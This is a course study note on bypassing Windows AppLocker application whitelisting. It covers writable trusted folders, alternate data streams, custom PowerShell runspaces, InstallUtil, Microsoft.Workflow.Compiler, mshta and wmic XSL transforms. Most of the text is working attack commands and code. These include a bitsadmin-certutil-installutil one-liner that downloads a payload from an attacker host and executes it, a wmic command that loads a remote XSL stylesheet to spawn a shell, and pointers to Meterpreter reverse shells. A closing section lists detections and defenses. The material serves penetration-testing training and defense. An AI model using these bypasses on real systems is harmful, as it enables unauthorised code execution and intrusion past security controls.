PEN-300 Module 12 — Application Whitelisting (AppLocker bypass: writable dirs → custom runspaces → InstallUtil → Workflow.Compiler → mshta/wmic)

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-300 (OSEP) course material (module: Application Whitelisting) — internal training reference, not for redistribution.

Objective

Application whitelisting blocks everything except a pre-defined ruleset — which kills custom binaries, most download-and-execute tradecraft, and the shellcode runners from earlier modules. The module teaches bypasses built on "Living off the land" (LOLBAS/LOLBIN): reusing existing trusted, signed applications so the whitelisting engine itself executes our code.

Progression mirrors the lab's hardening: start against AppLocker's default rules (weak), then survive progressively stricter rulesets (DLL rules, constrained language mode, InstallUtil deny rules) using increasingly advanced techniques:

  1. Basic bypasses — writable+executable trusted folders, unrestricted DLL loading, NTFS alternate data streams, third-party engines.
  2. PowerShell bypasses — constrained language mode (CLM) defeated via C# custom runspaces, then wrapped in InstallUtil for arbitrary C# execution.
  3. C# bypass from scratch — reverse engineering a signed Microsoft assembly (System.Workflow.ComponentModel.dll) to find an Assembly.Load code path, weaponized through Microsoft.Workflow.Compiler.exe.
  4. JScript bypasses — mshta.exe and XSL transformation via wmic.

Target surface

  • Lab: Windows 10 victim VM (test as the non-admin student user — admins are exempt from the rules), Windows 10 development machine (Visual Studio, dnSpy), Kali attacker at 192.168.119.120 hosting payloads on Apache. TeamViewer 12 is pre-installed on the victim (used for the ADS bypass); tools in C:\Tools (SysinternalsSuite, TestDll.dll, Invoke-ReflectivePEInjection.ps1, dnSpy).
  • Whitelisting tech covered: AppLocker (Win7+, Enterprise/Ultimate editions only; kernel driver APPID.SYS + user-mode APPIDSVC service), its predecessor SRP, third-party products (Symantec/Sophos/McAfee Application Control — same PsSetCreateProcessNotifyRoutineEx callback model, bypasses transfer with minor modifications), and WDAC (formerly Device Guard — hypervisor-enforced via VBS/HVCI, Windows 10/Server 2016/2019, rarely deployed due to strict hardware requirements; out of scope beyond theory).
  • Setup under test: default AppLocker rules for all four categories (exe, msi, scripts, packaged apps), enforced via gpedit.msc → Application Control Policies → AppLocker, gpupdate /force. Admin credentials for the Offsec account: [REDACTED]. Violations land in Event Viewer under Applications and Services Logs → Microsoft → Windows → AppLocker → EXE and DLL.
  • Rule types: path (file or recursive directory), hash (SHA256 Authenticode), publisher (all files signed by one publisher — survives version updates). Default executable rules allow everything under C:\Program Files, C:\Program Files (x86), C:\Windows; admins unrestricted. Quick sanity test: copy calc.exe out of System32 → "This program is blocked by group policy."
  • Extraction note: script rule category covers PowerShell/JScript/VBScript and .cmd/.bat — not third-party engines (Python) or compiled languages (Java).

Techniques

1. Trusted folders — writable + executable inside C:\Windows

The default rules assume non-admins can't write into C:\Windows. Find where that assumption fails:

accesschk.exe "student" C:\Windows -wus     :: writable subdirs, recursive, suppress errors → 29 found
icacls.exe C:\Windows\Tasks                 :: check execute rights — RX for NT AUTHORITY\Authenticated Users

C:\Windows\Tasks allows both write and execute for any authenticated user: copy any executable there and it runs despite AppLocker. The bypass is portable — enumerate once on a development machine, reuse on any compromised host with the same rules. (Exercise: find another usable directory; then harden with a deny path rule for C:\Windows\Tasks.)

2. DLL rules are off by default

The default ruleset doesn't restrict DLL loading. An unmanaged DLL whose exported run function opens a MessageBox (C:\Tools\TestDll.dll) executes via rundll32 from any location. Enabling DLL rule collection (Local Group Policy Editor → AppLocker properties → Advanced → "Enable the DLL rule collection" — with a performance warning) plus default DLL rules blocks it; but unless enforcement was hardened, the Tasks-folder copy trick still revives it. (Extra mile: the default Windows Installer rules are likewise bypassable.)

3. Alternate Data Streams (ADS)

NTFS files support multiple data streams. If any file inside a trusted folder is both writable and executable (TeamViewer 12's TeamViewer12_Logfile.log qualifies), stash a script in an ADS and execute the stream directly:

type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
dir /r "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log"   :: verify the :test.js:$DATA stream
wscript "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"   :: executes despite script rules

Exercise: replace the Jscript PoC with a DotNetToJscript shellcode runner for a Meterpreter shell.

4. Third-party execution gaps

AppLocker only governs native Windows executable/script types. Python (python test.py), Perl, Java (more commonly installed) run unrestricted; most importantly, VBA macros inside Microsoft Office documents execute regardless of the document's location — the client-side attack channel stays fully open. Exercise: msfvenom a Python Meterpreter payload and catch it.

5. PowerShell constrained language mode (CLM) — the terrain

When AppLocker (or WDAC) enforces rules against PowerShell scripts, PowerShell drops into ConstrainedLanguage: whitelisted scripts run fully, but command-line input and non-compliant scripts lose .NET method calls, C# execution, and reflection. Check with:

$ExecutionContext.SessionState.LanguageMode     # ConstrainedLanguage (student) vs FullLanguage (admin)
[Math]::Cos(1)                                   # "Method invocation is supported only on core types..."

Language modes in full: FullLanguage (default, everything), RestrictedLanguage (default cmdlets only), NoLanguage (no script text), ConstrainedLanguage (the AppLocker-enforced compromise). On Windows 7/8.1/early Win10, PowerShell 2 is co-installed and -Version 2 downgrades out of CLM entirely.

6. Custom runspaces — CLM bypass

powershell.exe is just a wrapper; the engine is System.Management.Automation.dll. The runspace APIs are public to managed C# — and a runspace created from C# is not subject to AppLocker's CLM enforcement (nor to a deny rule on powershell.exe itself):

Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = rs;
String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
ps.AddScript(cmd);
ps.Invoke();
rs.Close();

Assembly reference workaround: browse to C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35. Compile x64 Release; the EXE itself still has to pass executable rules (copy to C:\Windows\Tasks). Real use: swap cmd for a download cradle running PowerUp's Invoke-AllChecks inside the unrestricted runspace — full reuse of prior PowerShell tradecraft.

7. InstallUtil — arbitrary C# execution via a whitelisted binary

Removes the need to execute our own EXE. InstallUtil (a signed .NET tool in C:\Windows\Microsoft.NET\Framework64\v4.0.30319) runs the installer components of any assembly; code placed in the Uninstall method of a class marked [System.ComponentModel.RunInstaller(true)] executes via:

C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe

(/U selects Uninstall — the Install method needs admin.) The Main method is required but ignored — free space for AV-evasion content. Stuff the custom-runspace code into Uninstall and CLM is defeated through a fully whitelisted binary.

Delivery, living off the land (the C# file must exist on disk and survive AV): Base64-encode with certutil -encode, host the text file, download with bitsadmin /Transfer, decode with certutil -decode, execute with InstallUtil — chainable in one line with &&:

bitsadmin /Transfer myJob http://192.168.119.120/file.txt C:\users\student\enc.txt && certutil -decode C:\users\student\enc.txt C:\users\student\Bypass.exe && del C:\users\student\enc.txt && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\Bypass.exe

(Note: certutil can download directly over HTTP(S), but that usage is widely abused and triggers AV — hence the bitsadmin detour.) Combined with the module's Office-macro tradecraft: WMI executes InstallUtil instead of powershell.exe, and macros survive AppLocker. Reflective injection returns: the same runspace bypass downloads met.dll bytes (DownloadData), pulls Invoke-ReflectivePEInjection.ps1, and reflectively injects into explorer.exe — bypassing even AppLocker's DLL rules.

8. Finding a C# bypass by reverse engineering (Microsoft.Workflow.Compiler)

If InstallUtil gets a deny rule, find another whitelisted path to Assembly.Load / LoadFile / LoadFrom (or a compiler that builds source). Hunt with dnlib or Matt Graeber's LoadMethodScanner at scale, or manually with dnSpy — the course demonstrates the manual route on System.Workflow.ComponentModel.dll (signed by Microsoft, resident in the whitelisted C:\Windows\Microsoft.NET\Framework64\v4.0.30319):

  • WorkflowCompiler.Compile → WorkflowCompilerInternal.Compile → GenerateLocalAssembly → CodeDomProvider.CompileAssemblyFromFile → CompileAssemblyFromFileBatch → FromFileBatch → Assembly.Load — reached only when !FileIntegrity.IsEnabled; WldpIsDynamicCodePolicyEnabled returns true only under WDAC, so plain AppLocker leaves the path open.
  • Analyze ▸ Used By reveals Microsoft.Workflow.Compiler.exe calls Compile directly from Main with two arguments: an input XML path (parsed by ReadCompilerInput → XmlReader → DataContractSerializer.ReadObject into CompilerInput{parameters, files}) and an output XML path (WriteCompilerOutput — any throwaway filename).
  • Execution condition: after compilation, InternalCompileFromDomBatch instantiates every non-abstract class inheriting System.Workflow.ComponentModel.Activity via Activator.CreateInstance — the class constructor executes.
  • Input crafting without hand-serializing XML: reflectively invoke the private SerializeInputToWrapper (the assembly's own serializer) from PowerShell, set $compilerparam.GenerateInMemory = $True (required — without it OutputAssembly handling fails the compile), and pass an ordinary file containing C# as the files entry. Despite the .xoml extension check in the code, xoml parsing just extracts embedded code — a plain C# file with any extension works. Grant the student user FullControl on the generated XML (it was created by the admin Offsec user).
  • Payload shape and trigger:
using System.Workflow.ComponentModel;
public class Run : Activity {
    public Run() {
        Console.WriteLine("I executed!");   // constructor code = arbitrary execution
    }
}

C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml

Downside: XML + C# file on disk, and compilation writes temp files — but the skeleton applies to any C# tradecraft. (Extra mile: an equivalent bypass via the MSBuild native binary.)

9. JScript revival — MSHTA and XSL transformation

AppLocker's script rules block Jscript outside trusted locations, breaking the email/HTML-smuggling Jscript workflow. Two revivals:

MSHTA — mshta.exe is signed and in System32, hence whitelisted; it parses and executes Jscript/VBScript embedded in .hta files. Minimal PoC launches cmd.exe via WScript.Shell; deliver as a shortcut file pointing C:\Windows\System32\mshta.exe at the .hta URL on the Kali web server. Caveat: mshta downloads the file before execution, so endpoint detection still applies. Weaponize by embedding DotNetToJscript shellcode (or generate with SharpShooter) — a reverse shell from nothing but a shortcut file.

XSL transformation (Squiblytwo) — the XSLT spec allows embedded Jscript execution during transformation. Host the stylesheet, then trigger via WMIC's /format: switch:

<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var r = new ActiveXObject("WScript.Shell");
      r.Run("cmd.exe");
    ]]>
  </ms:script>
</stylesheet>

wmic process get brief /format:"http://192.168.119.120/test.xsl"

Also deliverable through a shortcut file; swap in a DotNetToJscript runner for a Meterpreter shell. (Extra mile: obtain a Covenant Grunt or Empire payload execution under AppLocker.)

Detection & defense

The module teaches bypasses, and its defensive subtext is explicit in the lab hardening steps — derived notes below, not course text:

  • Default AppLocker rules are a false comfort: 29 user-writable subdirectories exist under C:\Windows, at least one (C:\Windows\Tasks) also executable — remediate with explicit deny path rules (the course's own exercise), or move to publisher-based rules that don't rely on directory write permissions at all.
  • DLL rule collection is off by default (and carries a performance cost when enabled) — rundll32 loading from user-writable paths goes unnoticed unless it's on.
  • ADS abuse hides payloads inside legitimate files in trusted folders; dir /r on sensitive directories and watching wscript/cscript invocations with stream syntax (file:stream) catches it.
  • Third-party gaps: any installed scripting engine (Python, Java) is a whitelisting bypass by default — restrict or uninstall on locked-down endpoints; Office macro execution remains allowed regardless of file location, so macros need separate attack-surface reduction.
  • CLM and its bypasses: CLM is only as strong as the rules feeding it. The custom-runspace bypass leaves a user-written .NET executable on disk (in a trusted folder); the InstallUtil chain adds a distinctive native-tool sequence — bitsadmin network transfer of a Base64 text blob, certutil -decode, then installutil.exe /U on a file with no installer purpose. Each is alertable: bitsadmin downloads, certutil decode-then-execute chains, InstallUtil invocations outside software installation, and .NET assemblies executing from C:\Windows\Tasks-class directories. A deny rule on installutil.exe breaks the chain (the module itself notes this is why technique 8 exists).
  • Microsoft.Workflow.Compiler.exe has essentially no legitimate invocation profile — alerting on its execution outright neutralizes technique 8; mshta.exe fetching remote .hta files and wmic.exe with a /format: URL are equally strong signals.
  • Cross-cutting: every bypass ultimately abuses a signed Microsoft binary doing something unusual. Publisher rules plus behavioral detection on LOLBin execution patterns (not just path/hash rules) is the durable posture the module's progression implies.
